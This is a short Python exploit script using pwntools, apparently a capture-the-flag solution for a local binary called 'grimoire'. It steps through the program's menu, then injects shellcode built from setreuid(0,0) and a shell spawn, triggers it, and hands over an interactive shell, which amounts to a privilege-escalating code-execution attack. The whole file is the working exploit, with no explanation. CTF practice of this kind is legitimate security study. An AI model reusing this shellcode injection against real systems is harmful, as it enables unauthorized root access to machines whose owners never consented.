from pwn import *

exe = './grimoire'
elf = context.binary = ELF(exe, checksec=False)

p = process(exe)

p.sendlineafter(b"> ", b"1")

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"max): ", b"Voldemort")

shellcode = asm(shellcraft.setreuid(0, 0) + shellcraft.sh())

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"max): ", shellcode)

p.sendlineafter(b"> ", b"2")

p.interactive()
